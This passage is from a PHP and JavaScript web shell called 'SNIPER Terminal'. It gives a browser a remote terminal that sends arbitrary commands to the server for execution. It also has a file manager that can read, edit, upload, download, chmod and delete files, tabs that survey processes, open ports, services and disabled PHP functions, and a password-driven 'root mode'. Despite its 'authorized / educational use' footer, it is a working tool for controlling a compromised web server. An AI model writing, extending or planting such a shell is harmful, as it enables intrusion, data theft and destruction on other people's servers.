                        </div>
                    </div>
                    <div id="terminalPane" class="terminal-pane">
                        <div id="termScroll">
                            <div id="termBuffer"></div>
                        </div>
                        <div class="term-input-line">
                            <span class="term-prompt" id="termPrompt">sniper:~$</span>
                            <textarea id="termCmd" rows="1" spellcheck="false"
                                placeholder="type a command… (Enter=run · Shift+Enter=new line · ↑/↓=history)"
                                autocomplete="off"></textarea>
                        </div>
                    </div>
                </div>
                <div id="termWelcome" style="display:none"><?php echo htmlspecialchars($output_content); ?></div>

                <div class="status-bar">
                    <div class="connection-indicator">
                        <div class="indicator"></div>
                        <span>Connected · <?php
                            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost';
                            echo htmlspecialchars($host);
                        ?></span>
                    </div>
                    <div class="system-info">
                        <div class="info-item"><i class="fas fa-microchip"></i> PHP <?php echo $php_version; ?></div>
                        <div class="info-item"><i class="fas fa-server"></i> <?php echo htmlspecialchars($os_info); ?></div>
                        <div class="info-item"><i class="fas fa-clock"></i> <span id="clock"></span></div>
                    </div>
                </div>
            </div>

            <!-- System Overview -->
            <div class="card card-full">
                <h2 class="card-title"><i class="fas fa-chart-bar"></i> System Overview</h2>
                <div class="stat-grid">
                    <div class="stat-card">
                        <h3><i class="fas fa-server"></i> Hostname</h3>
                        <div class="stat-value sm-val"><?php echo htmlspecialchars($hostname_str); ?></div>
                        <div style="font-size:.8rem;color:var(--muted);margin-top:4px;">Server IP: <?php echo htmlspecialchars($server_ip); ?></div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-user-shield"></i> Client / Kernel</h3>
                        <div class="stat-value sm-val"><?php echo htmlspecialchars($client_ip); ?></div>
                        <div style="font-size:.78rem;color:var(--muted);margin-top:4px;"><?php echo htmlspecialchars($kernel_str); ?></div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-tasks"></i> Processes</h3>
                        <div class="stat-value"><?php echo $proc_count !== null ? $proc_count : '—'; ?></div>
                        <div style="font-size:.8rem;color:var(--muted);margin-top:4px;">running system-wide</div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fab fa-php"></i> Runtime</h3>
                        <div class="stat-value sm-val">PHP <?php echo htmlspecialchars(PHP_VERSION); ?></div>
                        <div style="font-size:.8rem;color:var(--muted);margin-top:4px;"><?php echo htmlspecialchars(PHP_SAPI); ?></div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-memory"></i> Memory</h3>
                        <div style="display:flex;justify-content:space-between;font-size:0.85rem;color:var(--muted);margin-bottom:4px;">
                            <span id="rtMemUsed"><?php echo formatBytes($memory_usage); ?> used</span>
                            <span id="rtMemPeak"><?php echo formatBytes($memory_peak); ?> peak</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" id="rtMemBar" style="width:<?php echo min(100, round($memory_percent)); ?>%;background:linear-gradient(90deg,var(--primary),var(--accent));"></div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-hdd"></i> Disk</h3>
                        <div style="display:flex;justify-content:space-between;font-size:0.85rem;color:var(--muted);margin-bottom:4px;">
                            <span><?php echo formatBytes($disk_used); ?> used</span>
                            <span><?php echo formatBytes($disk_total); ?> total</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width:<?php echo min(100, round($disk_percent)); ?>%;background:linear-gradient(90deg,var(--warning),#ff6d00);"></div>
                        </div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-microchip"></i> CPU Load</h3>
                        <div class="stat-value" id="rtCpu"><?php echo number_format($cpu_load_avg, 2); ?></div>
                        <div style="font-size:0.8rem;color:var(--muted);margin-top:4px;">1-min average · <span id="rtLive" style="color:var(--success);">live</span></div>
                    </div>

                    <div class="stat-card">
                        <h3><i class="fas fa-hourglass-half"></i> Uptime</h3>
                        <div class="stat-value" id="rtUptime" style="font-size:1.3rem;">
                            <?php echo $uptime_sec > 0 ? formatUptime($uptime_sec) : 'N/A'; ?>
                        </div>
                        <div style="font-size:0.8rem;color:var(--muted);margin-top:4px;">Server uptime</div>
                    </div>
                </div>
            </div>
            <!-- Advanced System Information -->
            <div class="card card-full">
                <h2 class="card-title"><i class="fas fa-network-wired"></i> System Information</h2>
                <div class="si-tabs">
                    <?php
                    $tabs = [
                        'processes' => ['Processes', 'fa-tasks', $sysinfo_processes],
                        'net'       => ['Interfaces', 'fa-ethernet', $sysinfo_net],
                        'ports'     => ['Open Ports', 'fa-plug', $sysinfo_ports],
                        'services'  => ['Services', 'fa-cogs', $sysinfo_services],
                        'php'       => ['PHP / Server', 'fa-code', null],
                    ];
                    $first = true;
                    foreach ($tabs as $key => [$label, $icon, $data]):
                    ?>
                    <button type="button" class="tab-btn <?php echo $first ? 'tab-active' : ''; ?>" data-tab="<?php echo $key; ?>" onclick="switchTab('<?php echo $key; ?>')">
                        <i class="fas <?php echo $icon; ?>"></i> <?php echo $label; ?>
                    </button>
                    <?php $first = false; endforeach; ?>
                </div>

                <?php
                $first = true;
                foreach ($tabs as $key => [$label, $icon, $data]):
                ?>
                <div class="tab-pane <?php echo $first ? '' : 'hidden'; ?>" id="pane-<?php echo $key; ?>">
                    <?php if ($key === 'php'): ?>
                        <div class="si-grid">
                            <div class="perm-item"><span class="k">Server</span><span class="v"><?php echo htmlspecialchars($sysinfo_server); ?></span></div>
                            <div class="perm-item"><span class="k">PHP Version</span><span class="v"><?php echo htmlspecialchars(PHP_VERSION); ?></span></div>
                            <div class="perm-item"><span class="k">Loaded Extensions</span><span class="v" style="font-size:0.7rem;"><?php echo htmlspecialchars($sysinfo_exts); ?></span></div>
                            <div class="perm-item"><span class="k">Disabled Functions</span><span class="v"><?php echo htmlspecialchars(ini_get('disable_functions') ?: 'none'); ?></span></div>
                            <div class="perm-item"><span class="k">Max Upload</span><span class="v"><?php echo htmlspecialchars(ini_get('upload_max_filesize')); ?></span></div>
                            <div class="perm-item"><span class="k">Memory Limit</span><span class="v"><?php echo htmlspecialchars(ini_get('memory_limit')); ?></span></div>
                        </div>
                    <?php elseif ($data === null): ?>
                        <pre class="si-pre">// Command unavailable on this system</pre>
                    <?php else: ?>
                        <table class="si-table"><tbody>
                        <?php foreach (explode("\n", $data) as $line): ?>
                            <tr><td><?php echo htmlspecialchars(preg_replace('/\s+/', '  ', trim($line))); ?></td></tr>
                        <?php endforeach; ?>
                        </tbody></table>
                    <?php endif; ?>
                </div>
                <?php $first = false; endforeach; ?>
            </div>
        </div>

        <footer>
            <p>SNIPER Terminal · For authorized / educational use only</p>
        </footer>
    </div>

    <script>
        // Matrix rain
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&*";
        const fontSize = 14;
        const columns = canvas.width / fontSize;
        const drops = Array.from({ length: columns }, () => Math.floor(Math.random() * canvas.height / fontSize));

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#ff0033';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars.charAt(Math.floor(Math.random() * chars.length));
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 40);

        function updateClock() {
            document.getElementById('clock').textContent = new Date().toLocaleTimeString();
        }
        setInterval(updateClock, 1000);
        updateClock();

        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });

        // ============================================
        // SINGLE-PANE KALI-STYLE TERMINAL
        // ============================================
        const termPane    = document.getElementById('terminalPane');
        const termScroll  = document.getElementById('termScroll');
        const termBuffer  = document.getElementById('termBuffer');
        const termCmdEl   = document.getElementById('termCmd');
        const termModes   = ['', 'term-tall', 'term-max'];
        const termIcons   = ['expand-alt', 'angle-double-up', 'compress-alt'];
        let   termCwd     = document.getElementById('workDirInput').value || '/';
        let   termHist    = [];          // in-memory only, NOT saved anywhere
        let   termHistIdx = 0;
        let   termFs      = parseFloat(localStorage.getItem('sniper_term_fs') || '0.9');
        if (!(termFs >= 0.55 && termFs <= 2)) termFs = 0.9;
        let   termModeIdx = parseInt(localStorage.getItem('sniper_term_mode') || '0');
        if (!(termModeIdx >= 0 && termModeIdx < termModes.length)) termModeIdx = 0;

        function shortPath(p) {
            return String(p).replace(/^\/home\/[^/]+/, '~').replace(/\/+$/, '') || '/';
        }
        function updatePrompt() {
            document.getElementById('termPrompt').textContent =
                'sniper:' + (shortPath(termCwd) === '' ? '/' : shortPath(termCwd)) + '$';
        }
        function termAppend(text, cls) {
            const d = document.createElement('div');
            d.className = cls || 'term-out';
            d.textContent = text;
            termBuffer.appendChild(d);
            termScroll.scrollTop = termScroll.scrollHeight;
        }
        function applyTermFs() {
            termScroll.style.fontSize = termFs + 'rem';
            document.querySelector('.term-prompt').style.fontSize = termFs + 'rem';
            termCmdEl.style.fontSize = termFs + 'rem';
            localStorage.setItem('sniper_term_fs', String(termFs));
        }
        function termFont(delta) {
            termFs = Math.min(2, Math.max(0.55, +(termFs + delta * 0.1).toFixed(2)));
            applyTermFs();
        }
        function termCycle() {
            termModes.forEach(m => termPane.classList.remove(m));
            termModeIdx = (termModeIdx + 1) % termModes.length;
            if (termModes[termModeIdx]) termPane.classList.add(termModes[termModeIdx]);
            localStorage.setItem('sniper_term_mode', String(termModeIdx));
            setTermSizeIcon();
        }
        function setTermSizeIcon() {
            document.getElementById('termSizeBtn').innerHTML =
                '<i class="fas fa-' + termIcons[termModeIdx] + '"></i>';
        }
        function termClear() {
            termBuffer.innerHTML = '';
            termAppend('sniper:~$ screen cleared.', 'term-out');
        }

        async function termRun() {
            const raw = termCmdEl.value.replace(/\s+$/, '');
            if (!raw.trim()) { termCmdEl.value = ''; return; }
            termAppend(document.getElementById('termPrompt').textContent + ' ' + raw, 'term-line-cmd');
            termCmdEl.value = '';
            termCmdEl.style.height = 'auto';
            try {
                const resp = await fetch('?ajax=term_exec', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ command: raw, work_dir: termCwd })
                });
                const j = await resp.json();
                if (!j.ok) {
                    termAppend('ERROR: ' + (j.error || 'execution failed'), 'term-out');
                } else {
                    if (j.output && j.output.trim() !== '') termAppend(j.output.replace(/\n$/, ''), 'term-out');
                    if (j.viewer && typeof openFileViewer === 'function') openFileViewer(j.viewer);
                    if (j.cwd && j.cwd !== termCwd) {
                        termCwd = j.cwd;
                        document.getElementById('workDirInput').value = j.cwd;
                        updatePrompt();
                    }
                }
            } catch (e) {
                termAppend('ERROR: network failure — ' + e, 'term-out');
            }
            // history (session-only)
            if (termHist[termHist.length - 1] !== raw) {
                termHist.push(raw);
                if (termHist.length > 200) termHist.shift();
            }
            termHistIdx = termHist.length;
        }

        termCmdEl.addEventListener('keydown', function(e) {
            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); termRun(); return; }
            if (e.key === 'ArrowUp' && !e.shiftKey) {
                e.preventDefault();
                if (termHist.length > 0) {
                    termHistIdx = Math.max(0, termHistIdx - 1);
                    termCmdEl.value = termHist[termHistIdx] || '';
                }
                return;
            }
            if (e.key === 'ArrowDown' && !e.shiftKey) {
                e.preventDefault();
                if (termHistIdx < termHist.length - 1) {
                    termHistIdx++;
                    termCmdEl.value = termHist[termHistIdx];
                } else {
                    termHistIdx = termHist.length;
                    termCmdEl.value = '';
                }
                return;
            }
            if (e.key === 'l' && e.ctrlKey) { e.preventDefault(); termClear(); return; }
        });
        // auto-grow input box for multi-line paste (Shift+Enter)
        termCmdEl.addEventListener('input', () => {
            termCmdEl.style.height = 'auto';
            termCmdEl.style.height = Math.min(termCmdEl.scrollHeight, 160) + 'px';
        });
        // click anywhere on terminal focuses the prompt
        termPane.addEventListener('click', () => termCmdEl.focus());
        // ESC exits fullscreen
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape' && termPane.classList.contains('term-max')) {
                termModeIdx = 0;
                termPane.classList.remove('term-max');
                localStorage.setItem('sniper_term_mode', '0');
                setTermSizeIcon();
            }
        });

        (function initTerm() {
            const w = document.getElementById('termWelcome');
            if (w && w.textContent.trim() !== '') termAppend(w.textContent.replace(/\n+$/, ''), 'term-out');
            applyTermFs();
            if (termModes[termModeIdx]) termPane.classList.add(termModes[termModeIdx]);
            setTermSizeIcon();
            updatePrompt();
            termCmdEl.focus();
        })();

        function changeDir(path) {
            document.getElementById('workDirInput').value = path;
            document.getElementById('commandForm').submit();
        }
        function handleDirChange() {
            const select = document.getElementById('dirSelect');
            changeDir(select.options[select.selectedIndex].value);
        }

        // ============================================
        // FILE VIEWER MODAL
        // ============================================
        const fileData = {
            path: <?php echo json_encode(isset($view_path) ? $view_path : ''); ?>,
            name: <?php echo json_encode($view_file_name); ?>,
            size: <?php echo json_encode($view_file_size); ?>,
            perms: <?php echo json_encode($view_file_perms); ?>,
            content: <?php echo json_encode($view_file_content); ?>,
            info: <?php echo json_encode(isset($view_file_info) ? $view_file_info : null); ?>,
            writable: <?php echo json_encode(isset($view_path) && is_file($view_path ?? '') ? is_writable($view_path) : false); ?>
        };

        let originalContent = '';
        let isEditing = false;

        function openFileViewer(path) {
            const url = new URL(window.location.href);
            url.searchParams.set('work_dir', document.getElementById('workDirInput').value);
            url.searchParams.set('view_file', path);
            window.location.href = url.toString();
        }

        function showFileModal(data) {
            document.getElementById('modalFileName').textContent = data.name || 'Unknown';
            document.getElementById('modalFilePath').textContent = data.path || '';
            
            const sizeEl = document.getElementById('modalFileSize');
            const permsEl = document.getElementById('modalFilePerms');
            sizeEl.textContent = data.size !== undefined ? formatBytesJS(data.size) : '';
            permsEl.textContent = data.perms ? ('perm: ' + data.perms + (data.writable ? ' [writable]' : ' [read-only]')) : '';

            const contentEl = document.getElementById('modalContent');
            const imgWrap = document.getElementById('modalImgWrap');

            // Image preview branch
            const isImage = data.info && typeof data.info.mime === 'string' && data.info.mime.startsWith('image/');
            if (isImage) {
                contentEl.style.display = 'none';
                imgWrap.style.display = 'flex';
                document.getElementById('modalImg').src =
                    '?raw_file=' + encodeURIComponent(data.path) + '&t=' + Date.now();
                document.getElementById('btnEdit').disabled = true;
                document.getElementById('btnEdit').style.opacity = '0.4';
                document.getElementById('modalLineCount').textContent = '[image preview · ' + formatBytesJS(data.size || 0) + ']';
            } else {
                imgWrap.style.display = 'none';
                contentEl.style.display = 'block';
                contentEl.textContent = data.content || '// Empty file';

                const lines = (data.content || '').split('\n').length;
                document.getElementById('modalLineCount').textContent = lines + ' lines · ' + formatBytesJS(new Blob([data.content || '']).size);

                // Edit button state
                const btnEdit = document.getElementById('btnEdit');
                if (data.writable === false || (data.content && data.content.startsWith('// [Binary File'))) {
                    btnEdit.disabled = true;
                    btnEdit.style.opacity = '0.4';
                    btnEdit.title = 'File is not editable';
                } else {
                    btnEdit.disabled = false;
                    btnEdit.style.opacity = '1';
                    btnEdit.title = '';
                }
            }

            isEditing = false;
            originalContent = data.content || '';
            document.getElementById('editToolbar').style.display = 'none';
            document.getElementById('saveForm').style.display = 'none';

            buildPermPanel(data.info);
            document.getElementById('fileModal').classList.add('active');
            document.body.style.overflow = 'hidden';
        }

        function closeFileModal() {
            if (isEditing && !confirm('Discard unsaved changes?')) return;
            document.getElementById('fileModal').classList.remove('active');
            document.body.style.overflow = '';
            const url = new URL(window.location.href);
            url.searchParams.delete('view_file');
            history.replaceState({}, '', url.toString());
        }

        // ===== DOWNLOAD =====
        function downloadCurrentFile() {
            if (!fileData.path) return;
            const url = new URL(window.location.href);
            url.searchParams.set('download_file', fileData.path);
            url.searchParams.delete('view_file');
            window.location.href = url.toString();
        }

        // ===== EDIT MODE =====
        function startEditFile() {
            if (!fileData.path || isEditing) return;
            if (fileData.content && fileData.content.startsWith('// [Binary File')) {
                alert('Binary files cannot be edited here');
                return;
            }
            isEditing = true;

            const pre = document.getElementById('modalContent');
            originalContent = pre.textContent === '// Empty file' ? '' : pre.textContent;

            document.getElementById('editPathInput').value = fileData.path;
            document.getElementById('editFileNameLabel').textContent = fileData.name || 'file';

            const ta = document.getElementById('editTextarea');
            ta.value = originalContent;

            pre.style.display = 'none';
            document.getElementById('saveForm').style.display = 'flex';
            document.getElementById('editToolbar').style.display = 'flex';

            setTimeout(() => ta.focus(), 50);
        }

        function cancelEdit() {
            if (!confirm('Discard changes?')) return;
            exitEditMode();
        }

        function exitEditMode() {
            isEditing = false;
            document.getElementById('saveForm').style.display = 'none';
            document.getElementById('editTextarea').value = '';
            document.getElementById('modalContent').style.display = 'block';
            document.getElementById('editToolbar').style.display = 'none';
        }

        // Save form submit — path already synced in startEditFile
        document.getElementById('saveForm').addEventListener('submit', () => {
            if (!isEditing) {
                // Safety: block stray submits when not editing
                event.preventDefault();
                return false;
            }
            document.getElementById('editPathInput').value = fileData.path || '';
        });

        // Ctrl+S inside edit textarea saves
        document.getElementById('editTextarea').addEventListener('keydown', e => {
            if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 's') {
                e.preventDefault();
                document.getElementById('saveForm').requestSubmit();
            }
            // Tab inserts tab instead of losing focus
            if (e.key === 'Tab') {
                e.preventDefault();
                const ta = e.target;
                const s = ta.selectionStart, en = ta.selectionEnd;
                ta.value = ta.value.slice(0, s) + '\t' + ta.value.slice(en);
                ta.selectionStart = ta.selectionEnd = s + 1;
            }
        });

        // ===== PERMISSIONS PANEL =====
        function togglePermPanel() {
            const panel = document.getElementById('permPanel');
            const visible = panel.style.display !== 'none';
            panel.style.display = visible ? 'none' : 'block';
            if (!visible && !document.getElementById('permGrid').innerHTML) {
                buildPermPanel(fileData.info);
            }
        }

        function buildPermPanel(info) {
            const grid = document.getElementById('permGrid');
            if (!info) {
                grid.innerHTML = '<div class="perm-item"><span class="k">No info available</span></div>';
                return;
            }
            const rows = [
                ['Symbolic', info.symbol],
                ['Octal', info.octal],
                ['Owner', info.owner + ' (' + info.owner_uid + ')'],
                ['Group', info.group + ' (' + info.group_gid + ')'],
                ['Size', formatBytesJS(info.size)],
                ['Type', info.type],
                ['MIME', info.mime],
                ['Modified', info.mtime],
                ['Changed', info.ctime],
                ['Readable', info.readable ? 'YES' : 'NO'],
                ['Writable', info.writable ? 'YES' : 'NO'],
                ['Executable', info.executable ? 'YES' : 'NO'],
            ];
            if (info.lines !== null && info.lines !== undefined) {
                rows.push(['Lines', info.lines]);
            }
            grid.innerHTML = rows.map(([k, v]) => {
                let cls = '';
                if (v === true) cls = 'yes';
                else if (v === false) cls = 'no';
                else if (v === 'YES') cls = 'yes';
                else if (v === 'NO') cls = 'no';
                return '<div class="perm-item"><span class="k">' + k + '</span><span class="v ' + cls + '">' + v + '</span></div>';
            }).join('');
            document.getElementById('chmodPathInput').value = fileData.path || '';
            document.getElementById('chmodViewReopen').value = fileData.path || '';
        }

        function copyFileContent() {
            const content = document.getElementById('modalContent').textContent;
            navigator.clipboard.writeText(content).then(() => {
                const btns = document.querySelectorAll('.modal-actions .btn-small')[0];
                const old = btns.innerHTML;
                btns.innerHTML = '<i class="fas fa-check"></i> Copied';
                setTimeout(() => btns.innerHTML = old, 1500);
            });
        }

        function formatBytesJS(bytes, precision = 2) {
            if (bytes === 0) return '0 B';
            const units = ['B', 'KB', 'MB', 'GB', 'TB'];
            const k = 1024;
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(precision)) + ' ' + units[i];
        }

        // Auto-open modal on page load if view_file param present
        document.addEventListener('DOMContentLoaded', () => {
            if (fileData.content !== null && fileData.name) {
                showFileModal(fileData);
            }
        });

        // ESC key closes modal
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape' && document.getElementById('fileModal').classList.contains('active')) {
                if (isEditing) {
                    exitEditMode();
                } else {
                    closeFileModal();
                }
            }
        });

        // Click outside modal closes it
        document.getElementById('fileModal').addEventListener('click', e => {
            if (e.target.id === 'fileModal') closeFileModal();
        });

        // Listen for postMessage from terminal output (for `cat` command)
        window.addEventListener('message', event => {
            if (event.data && event.data.type === 'openViewer' && event.data.path) {
                // Trigger file view via URL update
                const url = new URL(window.location.href);
                url.searchParams.set('view_file', event.data.path);
                // Remove the command param so terminal doesn't re-run cat
                url.searchParams.delete('command');
                window.location.href = url.toString();
            }
        });

        // ============================================
        // FILE OPERATIONS
        // ============================================
        function submitOps(op, target, dest) {
            document.getElementById('opsField_op').value = op;
            document.getElementById('opsField_target').value = target || '';
            document.getElementById('opsField_dest').value = dest || '';
            document.getElementById('opsForm').submit();
        }

        function jsOp(op, path) {
            if (!path) return;
            if (op === 'zip' && !confirm('Create ' + (path.split('/').pop()) + '.zip here?')) return;
            if (op === 'unzip' && !confirm('Extract this archive to a folder here?')) return;
            closeFileModalSilent();
            submitOps(op, path, '');
        }

        function jsNew(kind) {
            const label = kind === 'newfile' ? 'New file name' : 'New folder name';
            const name = prompt(label);
            if (name === null) return;
            if (!name.trim()) { alert('Name cannot be empty'); return; }
            submitOps(kind, name.trim(), document.getElementById('workDirInput').value);
        }

        function jsRename(path, currentName) {
            const newName = prompt('Rename to:', currentName);
            if (newName === null || !newName.trim() || newName === currentName) return;
            const parent = path.substring(0, path.lastIndexOf('/')) || '/';
            closeFileModalSilent();
            submitOps('rename', path, parent + '/' + newName.trim());
        }

        function jsCopyMove(mode) {
            const hint = mode === 'copy'
                ? 'Copy to full path/name:\n(same dir = just new name)'
                : 'Move to full destination path:';
            const dest = prompt(hint, fileData.path);
            if (dest === null || !dest.trim() || dest === fileData.path) return;
            closeFileModalSilent();
            submitOps(mode, fileData.path, dest.trim());
        }

        function jsDelete(path, isDir, fromModal) {
            const label = (isDir ? 'folder' : 'file') + ': ' + path.split('/').pop();
            if (!confirm('DELETE ' + label + '?\nThis cannot be undone.')) return;
            if (fromModal) closeFileModal(true);
            else closeFileModalSilent();
            submitOps('delete', path, '');
        }

        function jsDownload(path) {
            event.stopPropagation();
            const url = new URL(window.location.href);
            url.searchParams.set('download_file', path);
            url.searchParams.delete('view_file');
            window.location.href = url.toString();
        }

        function closeFileModalSilent() {
            document.getElementById('fileModal').classList.remove('active');
            document.body.style.overflow = '';
        }

        // ============================================
        // SYSTEM INFO TABS
        // ============================================
        function switchTab(key) {
            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('tab-active'));
            document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
            document.querySelector('.tab-btn[data-tab="' + key + '"]').classList.add('tab-active');
            document.getElementById('pane-' + key).classList.remove('hidden');
        }

        // ============================================
        // REALTIME STATS POLLING
        // ============================================
        let rtTimerFailed = false;
        function pollStats() {
            fetch('?ajax_stats=1', { headers: { 'Accept': 'application/json' } })
                .then(r => r.json())
                .then(d => {
                    document.getElementById('rtCpu').textContent = Number(d.load).toFixed(2);
                    document.getElementById('rtMemUsed').textContent = formatBytesJS(d.mem_usage) + ' used';
                    document.getElementById('rtMemPeak').textContent = formatBytesJS(d.mem_peak) + ' peak';
                    document.getElementById('rtUptime').textContent =
                        d.uptime_sec > 0 ? formatUptimeJS(d.uptime_sec) : 'N/A';
                })
                .catch(() => {
                    if (!rtTimerFailed) {
                        rtTimerFailed = true;
                        document.getElementById('rtLive').textContent = 'offline';
                        document.getElementById('rtLive').style.color = '#ff0033';
                        clearInterval(rtInterval);
                    }
                });
        }
        function formatUptimeJS(sec) {
            const d = Math.floor(sec / 86400), h = Math.floor((sec % 86400) / 3600),
                  m = Math.floor((sec % 3600) / 60);
            return d + 'd ' + h + 'h ' + m + 'm';
        }
        const rtInterval = setInterval(pollStats, 3000);

        // ============================================
        // FILE MANAGER UX EXTENSIONS
        // ============================================
        // Store full item count for filter label
        (function(){ const c = document.getElementById('itemCount'); if (c) c.dataset.full = c.textContent; })();

        // --- Live search filter ---
        document.getElementById('searchBox').addEventListener('input', function() {
            const q = this.value.toLowerCase().trim();
            let visible = 0;
            document.querySelectorAll('#directoryGrid .directory-item').forEach(t => {
                const match = !q || (t.dataset.name || '').includes(q);
                t.style.display = match ? '' : 'none';
                if (match) visible++;
            });
            const c = document.getElementById('itemCount');
            if (c) c.textContent = q ? (visible + ' matching "' + q + '"') : c.dataset.full;
        });

        // --- View mode toggle (grid <-> list) ---
        function jsToggleView() {
            const grid = document.getElementById('directoryGrid');
            grid.classList.toggle('list-mode');
            const isList = grid.classList.contains('list-mode');
            localStorage.setItem('sniper_view', isList ? 'list' : 'grid');
            document.getElementById('viewToggle').innerHTML =
                isList ? '<i class="fas fa-th"></i> View' : '<i class="fas fa-list"></i> View';
        }
        (function() {
            if (localStorage.getItem('sniper_view') === 'list') {
                document.getElementById('directoryGrid').classList.add('list-mode');
                const b = document.getElementById('viewToggle');
                if (b) b.innerHTML = '<i class="fas fa-th"></i> View';
            }
        })();

        // --- Fullscreen explorer ---
        function jsFs() {
            const card = document.getElementById('explorerCard');
            if (document.fullscreenElement) {
                document.exitFullscreen();
                card.classList.remove('fs-mode');
            } else {
                card.classList.add('fs-mode');
                if (card.requestFullscreen) card.requestFullscreen().catch(() => {});
            }
        }
        document.addEventListener('fullscreenchange', () => {
            if (!document.fullscreenElement)
                document.getElementById('explorerCard').classList.remove('fs-mode');
        });
        document.addEventListener('keydown', e => {
            if (e.key === 'Escape'
                && !document.getElementById('fileModal').classList.contains('active')
                && document.getElementById('explorerCard').classList.contains('fs-mode')) {
                jsFs();
            }
        });

        // --- Folder recursive size ---
        function jsDirSize(linkEl) {
            const path = linkEl.dataset.ds;
            linkEl.textContent = '[...]';
            fetch('?ajax_dirsize=' + encodeURIComponent(path))
                .then(r => r.json())
                .then(d => {
                    linkEl.textContent = '[' + formatBytesJS(d.size) + ' / ' + d.files + ' files' + (d.truncated ? '+' : '') + ']';
                })
                .catch(() => linkEl.textContent = '[err]');
        }

        // --- Duplicates finder ---
        function jsDupes() {
            const panel = document.getElementById('dupesPanel');
            const out = document.getElementById('dupeResults');
            panel.style.display = 'block';
            out.innerHTML = '<em><i class="fas fa-spinner fa-spin"></i> Scanning (max 4000 files, depth 4, size>0)...</em>';
            fetch('?ajax_dupes=' + encodeURIComponent(document.getElementById('workDirInput').value))
                .then(r => r.json())
                .then(d => {
                    if (!d.groups || !d.groups.length) {
                        out.innerHTML = '<span style="color:var(--success)">✔ No duplicate files found</span>';
                        return;
                    }
                    const esc = s => s.replace(/&/g,'&amp;').replace(/</g,'&lt;');
                    let html = '<div class="dp-sum">' + d.total_groups + ' duplicate group(s) — showing ' + d.groups.length + '</div>';
                    d.groups.forEach(g => {
                        html += '<div class="dp-group"><div class="dp-gname">'
                              + esc(g.paths[0].split('/').pop()) + ' · ' + formatBytesJS(g.size) + ' · ×' + g.count + '</div>'
                              + g.paths.map(p => '<div class="dp-path">' + esc(p) + '</div>').join('')
                              + '</div>';
                    });
                    out.innerHTML = html;
                })
                .catch(() => out.innerHTML = '<span style="color:var(--accent)">Scan failed</span>');
        }

        // --- Selection management ---
        function updateSelBar() {
            const n = document.querySelectorAll('#directoryGrid .itemCheck:checked').length;
            document.getElementById('selCountN').textContent = n;
            document.getElementById('selBar').style.display = n ? 'flex' : 'none';
        }
        document.getElementById('directoryGrid').addEventListener('change', e => {
            if (e.target.classList && e.target.classList.contains('itemCheck')) {
                e.target.closest('.directory-item').classList.toggle('sel', e.target.checked);
                updateSelBar();
            }
        });
        document.getElementById('selectAllChk').addEventListener('change', function() {
            const on = this.checked;
            document.querySelectorAll('#directoryGrid .directory-item').forEach(item => {
                if (item.style.display === 'none') return;   // skip filtered-out
                const c = item.querySelector('.itemCheck');
                if (!c) return;
                c.checked = on;
                item.classList.toggle('sel', on);
            });
            updateSelBar();
        });
        function clearSelection() {
            document.querySelectorAll('#directoryGrid .itemCheck').forEach(c => {
                c.checked = false;
                c.closest('.directory-item').classList.remove('sel');
            });
            const sa = document.getElementById('selectAllChk'); if (sa) sa.checked = false;
            updateSelBar();
        }
        function collectTargets() {
            return JSON.stringify([...document.querySelectorAll('#directoryGrid .itemCheck:checked')]
                .map(c => c.dataset.path));
        }
        function batchDeleteSelected() {
            const n = document.querySelectorAll('#directoryGrid .itemCheck:checked').length;
            if (!n || !confirm('DELETE ' + n + ' selected item(s)? This cannot be undone.')) return;
            closeFileModalSilent();
            document.getElementById('bfOp').value = 'batch_delete';
            document.getElementById('bfJson').value = collectTargets();
            document.getElementById('batchForm').submit();
        }
        function batchZipSelected() {
            const n = document.querySelectorAll('#directoryGrid .itemCheck:checked').length;
            if (!n) return;
            closeFileModalSilent();
            document.getElementById('bfOp').value = 'batch_zip';
            document.getElementById('bfJson').value = collectTargets();
            document.getElementById('batchForm').submit();
        }

        // --- Drag & drop upload zone ---
        const gridEl = document.getElementById('directoryGrid');
        ['dragenter','dragover'].forEach(ev => gridEl.addEventListener(ev, e => {
            e.preventDefault();
            gridEl.classList.add('dropzone-on');
        }));
        gridEl.addEventListener('dragleave', e => {
            e.preventDefault();
            if (!e.relatedTarget || !gridEl.contains(e.relatedTarget)) gridEl.classList.remove('dropzone-on');
        });
        gridEl.addEventListener('drop', e => {
            e.preventDefault();
            gridEl.classList.remove('dropzone-on');
            const files = e.dataTransfer && e.dataTransfer.files;
            if (!files || !files.length) return;
            const input = document.getElementById('upload_input');
            try { input.files = files; } catch (_) { /* older browsers */ input.files = files; }
            document.getElementById('uploadForm').submit();
        });

        // ============================================
        // ROOT MODE
        // ============================================
        function jsRootPost(op, pw) {
            document.getElementById('rootOpF').value = op;
            if (pw !== undefined) document.getElementById('rootPwF').value = pw;
            closeFileModalSilent();
            document.getElementById('rootForm').submit();
